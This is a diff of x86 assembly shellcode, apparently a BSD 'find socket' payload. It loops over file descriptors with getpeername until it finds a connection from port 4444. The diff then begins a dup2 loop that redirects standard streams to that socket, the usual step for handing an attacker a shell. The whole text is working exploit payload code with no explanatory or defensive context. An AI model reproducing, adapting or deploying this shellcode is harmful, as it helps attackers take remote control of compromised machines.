@@ -29,24 +29,24 @@ _start:
   push	edi
   mov	ebp, esp
 
+getpeername_loop:
+; 32-bit is okay since the connection should be establish already.
+  inc	edi
+
+  mov	esp, ebp
   push	byte 0x10
   push	esp
   push	ebp
   push	edi
-
-getpeername_loop:
   push	byte 0x1f 
   pop	eax
   push	byte 0x02
   int	0x80
 
-  pop	ecx
-  inc	word [esp]
-
   cmp	word [ebp + 2], 0x5c11
   jne	getpeername_loop
 
-  pop	edi
+  pop	ecx
 
 dup2_loop:
   push	ecx
